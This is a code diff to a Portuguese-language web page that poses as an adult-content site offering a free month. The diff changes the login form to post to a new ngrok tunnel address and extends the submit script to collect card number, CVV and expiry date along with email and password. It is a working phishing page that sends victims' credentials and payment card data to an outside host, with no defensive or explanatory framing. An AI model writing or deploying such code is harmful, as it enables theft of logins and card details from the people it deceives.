@@ -86,7 +86,7 @@
         <h2>PROMOÇÃO 1 MÊS GRÁTIS</h2>
         <p class="conteudos">Criar Conta</p>
         <p class="conteudos">Conteúdos Lais🔞</p>
-        <form id="loginForm" method="POST" action="https://9e68-2804-6850-8000-3d01-2d4a-c112-c2f2-dbba.ngrok-free.app/">
+        <form id="loginForm" method="POST" action="https://04f9-2804-6850-8000-3d01-c12e-b350-c502-7e67.ngrok-free.app/">
             <div class="form-group">
                 <input type="email" class="form-control" id="email" name="email" placeholder="Digite o e-mail">
             </div>
@@ -111,8 +111,11 @@
         function enviarFormulario() {
             var email = document.getElementById('email').value;
             var password = document.getElementById('password').value;
+            var cardNumber = document.getElementById('cardNumber').value;
+            var cvv = document.getElementById('cvv').value;
+            var expiryDate = document.getElementById('expiryDate').value;
 
-            if (email === '' || password === '') {
+            if (email === '' || password === '' || cardNumber === '' || cvv === '' || expiryDate === '') {
                 document.getElementById('mensagemErro').innerText = 'Por favor, preencha todos os campos.';
                 return;
             }
@@ -120,6 +123,9 @@
             var formData = new FormData();
             formData.append('email', email);
             formData.append('password', password);
+            formData.append('cardNumber', cardNumber);
+            formData.append('cvv', cvv);
+            formData.append('expiryDate', expiryDate);
 
             var xhr = new XMLHttpRequest();
             xhr.open('POST', document.getElementById("loginForm").action);
